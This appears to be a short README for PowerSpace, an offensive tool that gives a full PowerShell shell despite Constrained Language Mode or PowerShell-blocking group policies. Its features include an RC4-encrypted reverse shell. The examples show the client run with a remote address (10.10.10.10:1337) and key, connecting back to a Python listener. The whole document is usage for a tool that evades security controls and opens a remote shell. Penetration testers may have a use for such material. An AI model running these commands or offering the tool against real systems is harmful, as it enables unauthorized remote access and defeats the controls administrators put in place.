PowerSpace
==========

An interactive Runspace-based shell to provide full PowerShell support when constraints such as CLM or PowerShell-blocking GPOs are in place.


## Features
-----------
- Reverse shell.
- RC4 encryption.
- Execute either via pipeline or Powershell object.


## Examples
-----------

### Interactive shell

```
C:\Windows\Temp> .\PowerSpace.exe

[PowerSpace] C:\Windows\Temp> Write-Output 'Hello, world.'
Hello, world.
[PowerSpace] C:\Windows\Temp> exit

C:\Windows\Temp>
```

### Encrypted Reverse Shell

- Client
```
C:\Windows\Temp>.\PowerSpace.exe -c -v -r "10.10.10.10:1337" -k "1b3f1a40fb77c1e0"

[PowerSpace] Initializing the Runspace
[PowerSpace] Connecting to 10.10.10.10:1337
[PowerSpace] Connection closed by the remote host

C:\Windows\Temp>
```

- Server
```
user@host:~$ python PowerSpaceServer.py -k '1b3f1a40fb77c1e0' 1337

[PowerSpace] C:\Windows\Temp> exit
user@host:~$
```